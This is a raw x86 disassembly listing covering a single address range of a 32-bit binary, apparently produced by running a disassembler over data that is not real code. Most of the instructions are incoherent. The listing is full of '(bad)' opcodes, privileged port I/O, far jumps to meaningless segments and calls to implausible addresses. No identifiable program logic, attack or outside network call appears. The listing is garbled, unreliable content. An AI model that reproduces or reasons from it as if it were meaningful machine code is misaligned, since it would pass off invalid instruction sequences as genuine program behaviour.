  4086de:	add    BYTE PTR [edx+0x2971fe78],al
  4086e4:	cld    
  4086e5:	cmp    eax,0x1dc8c637
  4086ea:	cmp    ecx,edx
  4086ec:	out    0xd2,al
  4086ee:	aas    
  4086ef:	outs   dx,BYTE PTR ds:[esi]
  4086f0:	push   ds
  4086f1:	adc    eax,DWORD PTR [eax]
  4086f3:	add    BYTE PTR [ecx],bl
  4086f5:	leave  
  4086f6:	iret   
  4086f7:	mov    WORD PTR [ebx+0x5a],?
  4086fa:	mov    bh,0xbd
  4086fc:	adc    eax,0xec5ab7f8
  408701:	cs daa 
  408703:	in     eax,0xe6
  408705:	inc    ebp
  408706:	cmp    dh,BYTE PTR [edx+0x27a1ed13]
  40870c:	mov    ebx,0x6ad5f42a
  408711:	inc    esp
  408712:	cmp    al,0x36
  408714:	fild   QWORD PTR [edx+0x1be18bb6]
  40871a:	add    BYTE PTR ds:0x58bbefc2,bh
  408720:	pop    edx
  408721:	mov    ebx,0xbf93edc9
  408726:	mov    eax,ds:0x57cddfdb
  40872b:	(bad)  
  40872c:	out    dx,eax
  40872d:	loop   0x408789
  40872f:	dec    edx
  408730:	inc    eax
  408731:	pop    ebp
  408732:	add    ch,BYTE PTR [eax-0x43bf378c]
  408738:	shr    BYTE PTR [edx],cl
  40873a:	mov    cs,WORD PTR [edx]
  40873c:	xor    ch,BYTE PTR [edx+0x2a]
  40873f:	cwde   
  408740:	pop    ds
  408741:	inc    eax
  408742:	stc    
  408743:	adc    DWORD PTR [esp+0x62],edx
  408747:	fcompp 
  408749:	fcom   DWORD PTR ds:0x51b56095
  40874f:	push   ds
  408750:	outs   dx,DWORD PTR ds:[esi]
  408751:	push   esp
  408752:	lods   al,BYTE PTR ds:[esi]
  408753:	mov    esi,0xad374d71
  408758:	cdq    
  408759:	push   ebp
  40875a:	sbb    esi,DWORD PTR [eax-0x2ed763f2]
  408760:	mov    bh,0xfd
  408762:	jp     0x408737
  408764:	inc    edx
  408765:	mov    al,0xc1
  408767:	inc    ebp
  408768:	lods   eax,DWORD PTR ds:[esi]
  408769:	adc    cl,al
  40876b:	and    BYTE PTR [edi+eiz*4+0x78898402],bl
  408772:	inc    ecx
  408773:	jecxz  0x408714
  408775:	mov    ebp,0xf5f4a3fa
  40877a:	jle    0x408799
  40877c:	inc    esp
  40877d:	sbb    DWORD PTR [eax+0x7d],0xffffffac
  408781:	dec    BYTE PTR [eax-0x7c]
  408784:	jns    0x408772
  408786:	fs mov cl,0x91
  408789:	ins    BYTE PTR es:[edi],dx
  40878a:	xor    edi,0x41
  40878d:	dec    ebx
  40878e:	add    dh,BYTE PTR [eax]
  408790:	fild   DWORD PTR [esi-0x11]
  408793:	mov    bh,dl
  408795:	fild   QWORD PTR fs:[bx+si-0x765c]
  40879b:	cli    
  40879c:	sbb    cl,BYTE PTR [eax]
  40879e:	sbb    al,0xbe
  4087a0:	sahf   
  4087a1:	retf   0x36d5
  4087a4:	adc    edi,DWORD PTR [edx]
  4087a6:	lods   eax,DWORD PTR ds:[esi]
  4087a7:	and    esi,edi
  4087a9:	push   eax
  4087aa:	inc    ecx
  4087ab:	aad    0xd6
  4087ad:	lds    ecx,FWORD PTR [eax+ecx*1-0x393a7641]
  4087b4:	jle    0x40881c
  4087b6:	cld    
  4087b7:	jbe    0x408764
  4087b9:	mov    ds:0x4611760a,al
  4087be:	or     al,0x1
  4087c0:	(bad)  
  4087c1:	int3   
  4087c2:	inc    edi
  4087c3:	cmc    
  4087c4:	stc    
  4087c5:	int    0xf4
  4087c7:	mov    ds:0xf6104056,eax
  4087cc:	dec    esi
  4087cd:	dec    ebp
  4087ce:	dec    BYTE PTR [esi]
  4087d0:	dec    esi
  4087d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087d2:	xchg   bx,ax
  4087d4:	sub    ecx,esp
  4087d6:	test   al,0x1a
  4087d8:	xor    al,0xae
  4087da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087db:	hlt    
  4087dc:	cmc    
  4087dd:	mov    cl,0x3b
  4087df:	repnz xchg edi,eax
  4087e1:	(bad)  
  4087e2:	or     al,0xc8
  4087e4:	data16 test al,0xca
  4087e7:	jne    0x40883d
  4087e9:	adc    al,BYTE PTR [ebx]
  4087eb:	sbb    BYTE PTR [edx+eiz*8+0x1a94e7d],ch
  4087f2:	add    BYTE PTR [edi-0xf],dl
  4087f5:	fld    TBYTE PTR fs:[esi-0x790871a3]
  4087fc:	dec    esp
  4087fd:	adc    BYTE PTR [esi-0x13],0xd
  408801:	jnp    0x4087f1
  408803:	lds    edx,FWORD PTR [ebx+eax*4+0x30]
  408807:	shl    BYTE PTR [eax+0x4d4c2e01],1
  40880d:	xor    al,0x93
  40880f:	sbb    al,BYTE PTR [eax]
  408811:	jge    0x40886b
  408813:	mov    bh,0x75
  408815:	inc    esp
  408816:	call   DWORD PTR [esi]
  408818:	fisub  WORD PTR [ebx]
  40881a:	test   BYTE PTR [edi+esi*4-0x36235215],al
  408821:	neg    DWORD PTR [edx]
  408823:	or     eax,DWORD PTR [ebx+0x12]
  408826:	sti    
  408827:	inc    esp
  408828:	dec    eax
  408829:	test   BYTE PTR [eax+0x37],ch
  40882c:	cdq    
  40882d:	popf   
  40882e:	jp     0x408850
  408830:	dec    edx
  408831:	push   edi
  408832:	mov    ebx,0x727df157
  408837:	push   esp
  408838:	das    
  408839:	adc    eax,0x4b37b0e9
  40883e:	mov    edi,0xdfa4ea92
  408843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408844:	jl     0x4088a9
  408846:	repz or eax,0x52e23ebb
  40884c:	rcr    edi,0x96
  40884f:	aam    0x82
  408851:	and    BYTE PTR [eax+0x29],dh
  408854:	imul   ebp,DWORD PTR [edi+0x4f9fab11],0xffd18bac
  40885e:	jns    0x408806
  408860:	lods   al,BYTE PTR ds:[esi]
  408861:	retf   0xf3c0
  408864:	mov    ebp,0x29d0363e
  408869:	and    eax,0x1d444fe2
  40886e:	pop    ecx
  40886f:	aad    0x51
  408871:	mov    cl,0xba
  408873:	shl    BYTE PTR [eax+0x3d410b7c],0xee
  40887a:	adc    ebp,DWORD PTR [ecx-0x48]
  40887d:	popa   
  40887e:	loopne 0x4088f3
  408880:	loopne 0x408864
  408882:	scas   al,BYTE PTR es:[edi]
  408883:	shr    DWORD PTR [esi-0x422191b4],cl
  408889:	int    0xea
  40888b:	movnti DWORD PTR [eax],esi
  40888e:	xor    dl,0x26
  408891:	cld    
  408892:	adc    BYTE PTR [edi],0xd6
  408895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408896:	cmc    
  408897:	inc    esi
  408898:	and    eax,0xfdc94c8
  40889d:	pop    ss
  40889e:	aaa    
  40889f:	das    
  4088a0:	add    BYTE PTR [ebx],bh
  4088a2:	cmp    bh,al
  4088a4:	jns    0x40882d
  4088a6:	sub    BYTE PTR [bx+di],dh
  4088a9:	pop    ebp
  4088aa:	mov    ds:0x6452463e,eax
  4088af:	sub    esi,0xe0edf0a3
  4088b5:	and    bl,0x6f
  4088b8:	dec    ebx
  4088b9:	cmp    eax,DWORD PTR [esi]
  4088bb:	adc    BYTE PTR [eax+0x11],al
  4088be:	inc    esi
  4088bf:	test   DWORD PTR [edx-0x269ef173],edi
  4088c5:	jle    0x408908
  4088c7:	add    BYTE PTR [eax+0x171a71d5],bh
  4088cd:	xor    cl,BYTE PTR [eax+0x6d]
  4088d0:	or     ah,BYTE PTR ds:0x940ea8c
  4088d6:	cld    
  4088d7:	into   
  4088d8:	fiadd  WORD PTR [ebx+0xf]
  4088db:	xchg   edx,eax
  4088dc:	add    dl,dh
  4088de:	add    BYTE PTR [eax+0x3d2eeeab],dh
  4088e4:	adc    DWORD PTR [esi+0x25],ebp
  4088e7:	adc    al,0x8e
  4088e9:	call   0x38d27e90
  4088ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088ef:	cmc    
  4088f0:	cmp    edx,DWORD PTR cs:[ebx-0x12aa5eae]
  4088f7:	adc    eax,DWORD PTR [edi-0x3fef0883]
  4088fd:	repz jnp 0x40893a
  408900:	cs loopne 0x40889b
  408903:	pop    edi
  408904:	lahf   
  408905:	aaa    
  408906:	push   ecx
  408907:	int    0x66
  408909:	pop    ecx
  40890a:	jmp    0x4088a9
  40890c:	sbb    DWORD PTR [ecx+0x17],edx
  40890f:	hlt    
  408910:	mov    cl,0x52
  408913:	or     al,0x24
  408915:	lods   al,BYTE PTR ds:[esi]
  408916:	inc    ebx
  408917:	ret    0x8156
  40891a:	xor    BYTE PTR [ebx],ch
  40891c:	icebp  
  40891d:	bound  ebp,QWORD PTR [edx]
  40891f:	ret    0x7452
  408922:	push   0xa0e7c5a7
  408927:	enter  0x3419,0xb2
  40892b:	ss push esi
  40892d:	jne    0x40891b
  40892f:	xor    al,0xcc
  408931:	bound  esp,QWORD PTR [ebp+0xd98a9b1]
  408937:	aaa    
  408938:	mov    cl,0xe3
  40893a:	push   cs
  40893b:	mov    esp,0xd32abb07
  408940:	repz ss add al,0x79
  408944:	add    BYTE PTR ss:[eax-0x4a],dh
  408948:	adc    al,0x5c
  40894a:	sub    BYTE PTR [eax+esi*1+0x33],ch
  40894e:	repz add al,0x52
  408951:	rcl    BYTE PTR [ebp-0x7d],0x91
  408955:	inc    esi
  408956:	adc    al,0xe5
  408958:	pop    esi
  408959:	fstp   QWORD PTR [esi]
  40895b:	test   al,0x68
  40895d:	mov    bh,0xf2
  40895f:	mov    eax,0x14af8b1f
  408964:	xchg   ebp,eax
  408965:	push   es
  408966:	out    dx,al
  408967:	into   
  408968:	ins    DWORD PTR es:[edi],dx
  408969:	mov    ds:0xa2a494ee,al
  40896e:	adc    ecx,eax
  408970:	dec    eax
  408971:	xchg   esi,eax
  408972:	sub    DWORD PTR [ebp-0x18a1a5ab],edi
  408978:	push   es
  408979:	push   esp
  40897a:	popf   
  40897b:	test   BYTE PTR [edi+eax*2+0x46],dl
  40897f:	lea    eax,[edi]
  408981:	ins    BYTE PTR es:[edi],dx
  408982:	sbb    eax,DWORD PTR [esi-0x66a01cae]
  408988:	cmc    
  408989:	lds    eax,FWORD PTR [ebp+0xb02858c]
  40898f:	ret    0xf8bf
  408992:	cmc    
  408993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408994:	sub    DWORD PTR [ebp+0x64438161],esi
  40899a:	mov    ch,0x9f
  40899c:	sub    BYTE PTR [edx+eiz*4-0x548a0d8b],bh
  4089a3:	enter  0x393d,0x41
  4089a7:	cmc    
  4089a8:	push   edi
  4089a9:	(bad)  
  4089aa:	call   0x5d4b3b73
  4089af:	js     0x40896d
  4089b1:	inc    eax
  4089b2:	pop    edi
  4089b3:	pop    esp
  4089b4:	xor    DWORD PTR [eax-0x71],ecx
  4089b7:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4089b9:	sbb    eax,DWORD PTR [eax]
  4089bb:	lock (bad) 
  4089bd:	cli    
  4089be:	cli    
  4089bf:	xchg   edi,eax
  4089c0:	rcr    DWORD PTR [ecx+eiz*2-0x64],cl
  4089c4:	(bad)  
  4089c5:	adc    bh,BYTE PTR ds:0xc62fea2
  4089cb:	das    
  4089cc:	gs dec ecx
  4089ce:	clc    
  4089cf:	ins    DWORD PTR es:[edi],dx
  4089d0:	addr16 push esp
  4089d2:	fidivr WORD PTR [edi-0x6d5c09d3]
  4089d8:	xor    dl,dl
  4089da:	mov    edx,0xd28f5ebf
  4089df:	aaa    
  4089e0:	stos   BYTE PTR es:[edi],al
  4089e1:	cmp    eax,0x87950874
  4089e6:	test   eax,0x76a35553
  4089eb:	dec    eax
  4089ec:	loop   0x408a0d
  4089ee:	inc    eax
  4089ef:	inc    ebx
  4089f0:	fadd   QWORD PTR [edi-0x69]
  4089f3:	mov    edx,0x50db7a79
  4089f8:	aaa    
  4089f9:	lods   eax,DWORD PTR ds:[esi]
  4089fa:	lea    edx,[esp+eax*2]
  4089fd:	repnz stc 
  4089ff:	mov    edx,0x40ab586c
  408a04:	ror    esp,cl
  408a06:	ja     0x408a63
  408a08:	loop   0x408a13
  408a0a:	(bad)  
  408a0b:	push   cs
  408a0c:	mov    BYTE PTR [edx+0x0],bl
  408a0f:	mov    fs,WORD PTR [ebx+0xd]
  408a12:	adc    eax,0x380148c0
  408a17:	cwde   
  408a18:	mov    ah,0x54
  408a1a:	and    BYTE PTR [eax-0x4777f895],0x4b
  408a21:	mov    edi,esi
  408a23:	scas   al,BYTE PTR es:[edi]
  408a24:	test   eax,0x9f6d6bcc
  408a29:	cmp    eax,0xd02f93ae
  408a2e:	mov    eax,ds:0x57a77ac3
  408a33:	rcl    BYTE PTR [ecx],1
  408a35:	xchg   esi,eax
  408a36:	add    BYTE PTR [esi],dh
  408a38:	and    DWORD PTR [edi+0x74426c7f],edi
  408a3e:	xchg   edi,eax
  408a3f:	pop    ebp
  408a40:	cmp    al,0x1
  408a42:	mov    al,0xb9
  408a44:	xchg   BYTE PTR [eax],al
  408a46:	or     DWORD PTR [esi-0x65],0x35
  408a4a:	add    ebp,edi
  408a4c:	rcr    BYTE PTR [ebx+eiz*4],cl
  408a4f:	test   eax,0xe7f4f836
  408a54:	sbb    al,BYTE PTR [esi+edi*2]
  408a57:	test   al,0xe3
  408a59:	add    al,0x94
  408a5b:	and    al,0x80
  408a5d:	mov    dl,0x4b
  408a5f:	ds sbb eax,0xc998e7f0
  408a65:	mov    BYTE PTR [ebp+ecx*8+0x2],al
  408a69:	and    eax,0x30fe6316
  408a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a6f:	or     DWORD PTR [esi-0x36a4be84],ebp
  408a75:	(bad)
  408a7a:	fcom   DWORD PTR [ebx-0xffbf3d2]
  408a80:	fiadd  DWORD PTR [ebx-0x56]
  408a83:	ins    BYTE PTR es:[edi],dx
  408a84:	clc    
  408a85:	in     eax,dx
  408a86:	mov    edx,0x696accaf
  408a8b:	or     cl,BYTE PTR [edi-0x5c635784]
  408a91:	xchg   edi,eax
  408a93:	test   eax,0xf61d3e11
  408a98:	mov    esp,0x6ce39ead
  408a9d:	test   eax,0x9413ba99
  408aa2:	add    BYTE PTR [edx+ecx*1+0x2302f980],cl
  408aa9:	mov    al,ds:0x2a4e0324
  408aae:	not    DWORD PTR ds:0xed03bbbe
  408ab4:	dec    ebx
  408ab5:	lods   eax,DWORD PTR ds:[esi]
  408ab6:	adc    DWORD PTR [ebx-0xe947dfa],edi
  408abc:	dec    esp
  408abd:	sub    ebx,DWORD PTR [eax-0x55b12c3f]
  408ac3:	adc    ecx,ebx
  408ac5:	jmp    0x4cfdf024
  408aca:	cdq    
  408acb:	out    dx,eax
  408acc:	push   ebx
  408acd:	cmp    al,0x7
  408acf:	push   eax
  408ad0:	sub    BYTE PTR [ebp+0xd],0x15
  408ad4:	in     eax,0x3b
  408ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ad7:	ins    BYTE PTR es:[edi],dx
  408ad8:	scas   eax,DWORD PTR es:[edi]
  408ad9:	loopne 0x408aca
  408adb:	push   DWORD PTR [esi+edi*1]
  408ade:	dec    ebx
  408adf:	mov    ebp,0x99e87a5b
  408ae4:	add    DWORD PTR ds:0x18d8b1d9,0xffffffc8
  408aeb:	shl    BYTE PTR [edi+ebx*8],cl
  408aee:	push   edi
  408aef:	push   ds
  408af0:	mov    dh,0x0
  408af2:	test   BYTE PTR [ecx+0x5e63436d],bh
  408af8:	clc    
  408af9:	mov    ebx,DWORD PTR [ecx+0x73fe9c54]
  408aff:	lods   al,BYTE PTR ds:[esi]
  408b00:	dec    esp
  408b01:	mov    ds:0xfc37ff3c,eax
  408b06:	jg     0x408aaf
  408b08:	gs jae 0x408a9a
  408b0b:	mov    edi,0xe4d3f44c
  408b10:	inc    esp
  408b11:	mov    DWORD PTR [esi-0xe],ebp
  408b14:	dec    edx
  408b15:	mov    ah,0xcf
  408b17:	inc    ecx
  408b18:	lds    esp,FWORD PTR [edx]
  408b1a:	and    eax,0xd5be802d
  408b1f:	scas   al,BYTE PTR es:[edi]
  408b20:	aam    0xb9
  408b22:	sbb    esi,DWORD PTR [edx+0x33]
  408b25:	xchg   edx,eax
  408b26:	mov    ds:0x17aa0b7c,al
  408b2b:	rcr    DWORD PTR [esp+esi*8+0x21],cl
  408b2f:	out    dx,al
  408b30:	mov    ch,0x79
  408b32:	inc    ebx
  408b33:	pop    es
  408b34:	dec    ebx
  408b35:	das    
  408b36:	push   ebp
  408b37:	mov    DWORD PTR [ebx-0x7f],edx
  408b3a:	pop    ebp
  408b3b:	or     eax,0x8434866d
  408b40:	jp     0x408b45
  408b42:	or     BYTE PTR [ecx],dh
  408b44:	push   es
  408b45:	mov    BYTE PTR [eax+edi*1-0x4d9d5076],cl
  408b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b4d:	jl     0x408ad8
  408b4f:	fidivr WORD PTR [edx]
  408b51:	push   eax
  408b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b53:	popf   
  408b54:	stos   DWORD PTR es:[edi],eax
  408b55:	jecxz  0x408b09
  408b57:	add    DWORD PTR [ecx],ebp
  408b59:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  408b5b:	dec    ebp
  408b5c:	sar    DWORD PTR [ecx+ebp*1+0x20],cl
  408b60:	ins    BYTE PTR es:[edi],dx
  408b61:	mov    esi,0x867c3d07
  408b66:	xlat   BYTE PTR ds:[ebx]
  408b67:	pop    ss
  408b68:	js     0x408b6b
  408b6a:	ret    0xfff4
  408b6d:	adc    DWORD PTR [ebx+0x50],ebp
  408b70:	inc    ecx
  408b71:	ja     0x408b5e
  408b73:	jmp    0xd5bb:0x239263c
  408b7a:	inc    edx
  408b7b:	sbb    al,0xb3
  408b7d:	sbb    DWORD PTR [ecx],ecx
  408b7f:	out    0x5f,eax
  408b81:	mov    al,0xba
  408b83:	xchg   esp,ebx
  408b85:	cmp    al,0xdf
  408b87:	cmp    BYTE PTR [ebx],0xd
  408b8a:	adc    eax,0x39e34061
  408b8f:	xchg   ebp,eax
  408b90:	and    al,0xb3
  408b92:	jg     0x408b36
  408b94:	sub    dl,BYTE PTR [ebx]
  408b96:	rcr    DWORD PTR [ebx+eax*1-0x3f],0x71
  408b9b:	xor    BYTE PTR [ecx+ebx*4],al
  408b9e:	pop    ebp
  408b9f:	pop    edi
  408ba0:	xchg   BYTE PTR [ecx+0x2],bl
  408ba3:	cmp    dl,ch
  408ba5:	ja     0x408b78
  408ba7:	push   es
  408ba8:	pop    esi
  408ba9:	fst    QWORD PTR [ecx+0x14]
  408bac:	add    esp,DWORD PTR [eax]
  408bae:	lock ja 0x408b8d
  408bb1:	pop    esp
  408bb2:	add    eax,DWORD PTR [eax]
  408bb4:	mov    ds:0x17b9f1db,al
  408bb9:	repz mov cl,0xc7
  408bbc:	std    
  408bbd:	push   edx
  408bbe:	inc    ebx
  408bbf:	xor    eax,0x1685d308
  408bc4:	pop    ebx
  408bc5:	std    
  408bc6:	ret    
  408bc7:	es js  0x408b7a
  408bca:	ret    
  408bcb:	repnz cmp esi,0x2e20c669
  408bd2:	sub    eax,0x81b04d4d
  408bd7:	sar    al,0x9e
  408bda:	sbb    DWORD PTR [esi],0x17
  408bdd:	repz cs out dx,al
  408be0:	shl    BYTE PTR [edx+esi*8-0x5575105d],cl
  408be7:	push   0xffffffc1
  408be9:	test   al,0x35
  408beb:	div    DWORD PTR [ecx-0x5425e6ad]
  408bf1:	outs   dx,DWORD PTR ds:[esi]
  408bf2:	mul    BYTE PTR [eax]
  408bf4:	int    0x47
  408bf6:	jg     0x408ba7
  408bf8:	dec    ecx
  408bf9:	cmp    ebx,DWORD PTR [edx+0xc6d8081]
  408bff:	cmp    ebx,DWORD PTR [ebx]
  408c01:	test   eax,0x98d2a821
  408c06:	test   edx,eax
  408c08:	push   es
  408c09:	sub    DWORD PTR [ebp-0x70],0xd195c602
  408c10:	or     ah,cl
  408c12:	mov    ecx,0x523d394f
  408c17:	dec    BYTE PTR [eiz*4+0x396a4b6]
  408c1e:	dec    edx
  408c1f:	jbe    0x408c0a
  408c21:	mov    edx,0x86150811
  408c26:	sub    DWORD PTR [di+0x51b7],ebp
  408c2b:	iret   
  408c2c:	call   0x7e560a8b
  408c31:	mov    ds:0x7fbd8e9c,al
  408c36:	jne    0x408cb7
  408c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c39:	inc    esp
  408c3a:	dec    ecx
  408c3b:	sbb    ch,BYTE PTR [ecx-0x7a97650f]
  408c41:	fidivr WORD PTR [edx+0x47a68ba5]
  408c47:	addr16 test al,0xfd
  408c4a:	push   esp
  408c4b:	test   esi,edi
  408c4d:	cmp    eax,0x156e3744
  408c52:	sbb    edx,DWORD PTR [ecx]
  408c54:	push   es
  408c55:	add    ah,BYTE PTR [esi-0x2fbf7c11]
  408c5b:	cmp    edx,eax
  408c5d:	dec    esi
  408c5e:	outs   dx,BYTE PTR ds:[esi]
  408c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c60:	dec    edx
  408c61:	jge    0x408c68
  408c63:	in     eax,0x9a
  408c65:	inc    esi
  408c66:	sbb    al,0xc2
  408c68:	pop    ebp
  408c69:	rcr    DWORD PTR [esi],1
  408c6b:	cli    
  408c6c:	mov    BYTE PTR [edi],dh
  408c6e:	inc    ebp
  408c6f:	xchg   edi,eax
  408c70:	les    ebp,FWORD PTR [esp+ebx*8-0x6da8170]
  408c77:	sbb    al,0xe3
  408c79:	addr16 clc 
  408c7b:	cmp    DWORD PTR [edx+eax*2-0x5e],0x1d
  408c80:	out    dx,eax
  408c81:	repnz std 
  408c83:	xchg   cl,dh
  408c85:	iret   
  408c86:	pop    esi
  408c87:	stc    
  408c88:	mov    eax,ds:0x5c0efebe
  408c8d:	jle    0x408c33
  408c8f:	dec    edx
  408c90:	popf   
  408c91:	cdq    
  408c92:	pop    ebp
  408c93:	add    DWORD PTR cs:[edx],ebx
  408c96:	sub    BYTE PTR [edx+ecx*1-0x49],ah
  408c9a:	and    edx,ebp
  408c9c:	adc    bl,BYTE PTR [eax+0x44768c9d]
  408ca2:	daa    
  408ca3:	call   0x247bf825
  408ca8:	adc    ebp,ebp
  408caa:	pop    es
  408cab:	(bad)  
  408cac:	in     al,0x1b
  408cae:	push   0x40
  408cb0:	jo     0x408cb0
  408cb2:	(bad)  [ebx-0x42]
  408cb5:	adc    ah,BYTE PTR [eax-0x4]
  408cb8:	xchg   BYTE PTR ds:0x510048c0,cl
  408cbe:	dec    ebx
  408cbf:	hlt    
  408cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cc1:	nop
  408cc2:	push   cs
  408cc3:	sbb    BYTE PTR [ecx],dh
  408cc5:	add    ebx,DWORD PTR [edx]
  408cc7:	out    dx,eax
  408cc8:	mov    eax,ds:0x1551e2db
  408ccd:	call   0x5074:0x9519d1a9
  408cd4:	push   edi
  408cd5:	cmp    eax,0x1800c566
  408cda:	fbld   TBYTE PTR ds:0xf38717dc
  408ce0:	enter  0xf761,0xc4
  408ce4:	pusha  
  408ce5:	mov    al,0xc3
  408ce7:	(bad)  
  408ce8:	shl    dh,1
  408cea:	imul   BYTE PTR [edx]
  408cec:	in     eax,dx
  408ced:	sbb    BYTE PTR [edi+0x54675f15],bl
  408cf3:	movhps xmm0,QWORD PTR [edx]
  408cf6:	daa    
  408cf7:	loopne 0x408d2b
  408cf9:	rol    DWORD PTR [eax+edx*4+0x55144248],0xe4
  408d01:	(bad)  
  408d02:	bound  edi,QWORD PTR [ebx+0x68]
  408d05:	jmp    0x6edee7d9
  408d0a:	in     al,0x69
  408d0c:	pusha  
  408d0d:	inc    edi
  408d0e:	push   0xb61768d9
  408d13:	cli    
  408d14:	add    eax,0xe99a13b
  408d19:	push   0x8c62c633
  408d1e:	push   ds
  408d1f:	push   es
  408d20:	adc    dh,BYTE PTR [eax+ecx*8-0x326c7ccb]
  408d27:	mov    esi,0x1043d046
  408d2c:	add    al,0x1
  408d2e:	repz jns 0x408cd8
  408d31:	mov    es,WORD PTR [edi]
  408d33:	(bad)  
  408d35:	dec    edi
  408d36:	mov    dl,0x7d
  408d38:	(bad)  
  408d39:	mov    cl,0xbe
  408d3b:	cmp    ch,bl
  408d3d:	cmp    dh,BYTE PTR ds:0x571f1f49
  408d43:	sbb    BYTE PTR [eax],0x66
  408d46:	stc    
  408d47:	ss in  eax,dx
  408d49:	mov    ch,0xef
  408d4b:	fisttp DWORD PTR [edx+eax*4+0x2952e23a]
  408d52:	enter  0x4134,0x75
  408d56:	adc    ebx,edi
  408d58:	add    al,0x20
  408d5a:	xor    cl,BYTE PTR [esi]
  408d5c:	xchg   cl,bl
  408d5e:	dec    ebp
  408d5f:	popf   
  408d60:	cs mov ch,0xb9
  408d63:	cmp    eax,0x7b1b2e52
  408d68:	jmp    0x408d33
  408d6a:	ds pop es
  408d6c:	mov    al,0xa
  408d6e:	jmp    0x8b60:0x72f0bb6a
  408d75:	cmp    cl,bl
  408d77:	jmp    0xae37fa4b
  408d7c:	aaa    
  408d7d:	test   BYTE PTR [eax],0x99
  408d80:	std    
  408d81:	std    
  408d82:	pop    esi
  408d83:	xchg   ebx,eax
  408d84:	pop    ds
  408d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d86:	cmc    
  408d87:	jne    0x408de7
  408d89:	stc    
  408d8a:	sbb    BYTE PTR [ebx],cl
  408d8c:	(bad)  
  408d8d:	pushf  
  408d8e:	push   edx
  408d8f:	mov    cl,0x26
  408d91:	lahf   
  408d92:	jle    0x408e03
  408d94:	xchg   esp,eax
  408d95:	mov    ah,BYTE PTR [edi]
  408d97:	mov    ds:0x8161f914,eax
  408d9c:	push   cs
  408d9d:	sbb    al,0x2d
  408d9f:	das    
  408da0:	ror    BYTE PTR [ebp-0x279d547d],1
  408da6:	cmp    bl,bl
  408da8:	jae    0x408d89
  408daa:	mov    esp,0x5dc1b987
  408daf:	lods   eax,DWORD PTR ds:[esi]
  408db0:	push   0x62
  408db2:	inc    ebx
  408db3:	push   ss
  408db4:	add    al,0x74
  408db6:	fst    st(1)
  408db8:	aaa    
  408db9:	inc    eax
  408dba:	out    dx,eax
  408dbb:	arpl   bp,si
  408dbd:	rol    BYTE PTR [edi+eiz*1+0x1a],0x3
  408dc2:	xor    eax,0x462d60e8
  408dc7:	jg     0x408da7
  408dc9:	aad    0x46
  408dcb:	aaa    
  408dcc:	pop    eax
  408dcd:	mov    edx,0xddf571bf
  408dd2:	sbb    ch,bh
  408dd4:	mov    ds:0xed0cfce1,al
  408dd9:	jno    0x408db2
  408ddb:	ror    BYTE PTR [ebp-0x34],1
  408dde:	daa    
  408ddf:	enter  0xc057,0xe
  408de3:	(bad)  
  408de4:	arpl   WORD PTR [esi],bx
  408de6:	repnz inc ecx
  408de8:	cli    
  408de9:	sbb    esp,edi
  408deb:	es jmp 0xe856398e
  408df1:	shl    DWORD PTR [ebx],0x30
  408df4:	stos   BYTE PTR es:[edi],al
  408df5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408df6:	imul   esp,DWORD PTR [esp+ecx*4],0xffffffdd
  408dfa:	cmp    BYTE PTR [ecx*2-0x5ae860e9],dh
  408e01:	call   0x5533e189
  408e06:	sahf   
  408e07:	mov    al,0xe7
  408e09:	mov    ch,0xe7
  408e0b:	ins    DWORD PTR es:[edi],dx
  408e0c:	xor    BYTE PTR [esi],dh
  408e0e:	pusha  
  408e0f:	sahf   
  408e10:	add    al,0xb0
  408e12:	cwde   
  408e13:	dec    BYTE PTR [edi]
  408e15:	add    BYTE PTR [eax+0x4e],al
  408e18:	(bad)  
  408e19:	jge    0x408e17
  408e1b:	and    BYTE PTR [ebp+0x3f],0x3e
  408e1f:	pop    ebp
  408e20:	adc    BYTE PTR [edi+esi*1+0x15],al
  408e24:	jae    0x408e73
  408e26:	xor    BYTE PTR [ebx],cl
  408e28:	rol    BYTE PTR [ecx-0x76],0x69
  408e2c:	in     al,0x8a
  408e2e:	lea    ecx,[esi]
  408e30:	fisttp WORD PTR [esi+0x2a]
  408e33:	inc    eax
  408e34:	bound  edi,QWORD PTR [eax-0x4778eaa9]
  408e3a:	jbe    0x408eb6
  408e3c:	pushf  
  408e3d:	ds in  eax,0x74
  408e40:	rcl    DWORD PTR ds:0x1677060c,cl
  408e46:	fidiv  DWORD PTR [ebp+esi*8-0x358d6e21]
  408e4d:	mov    esi,0xf708d3df
  408e52:	inc    ebp
  408e53:	rol    esi,0x2b
  408e56:	js     0x408ead
  408e58:	call   0xf629a625
  408e5d:	sub    al,0x15
  408e5f:	inc    eax
  408e60:	out    0xc1,eax
  408e62:	push   ss
  408e63:	push   esp
  408e64:	es dec edx
  408e66:	sub    ecx,eax
  408e68:	clc    
  408e69:	rol    DWORD PTR [ecx+0x19f3460e],0xa
  408e70:	or     edi,DWORD PTR [edx+0x5a]
  408e73:	mov    esi,fs
  408e75:	fistp  DWORD PTR [edi]
  408e77:	push   ss
  408e78:	mov    al,bl
  408e7a:	dec    ebx
  408e7b:	cmp    eax,0xe8c4ad6
  408e80:	repz adc BYTE PTR [eax+0x66b926e3],bl
  408e87:	pop    ds
  408e88:	xor    edx,eax
  408e8a:	fbstp  TBYTE PTR [esi+0x35cdd00f]
  408e90:	(bad)  
  408e91:	outs   dx,BYTE PTR ds:[esi]
  408e92:	mov    bh,0x4a
  408e94:	dec    eax
  408e95:	sub    eax,0xd66ef166
  408e9a:	sahf   
  408e9b:	data16 mov ah,0x14
  408e9e:	ror    BYTE PTR [eax],1
  408ea0:	into   
  408ea1:	xchg   edi,eax
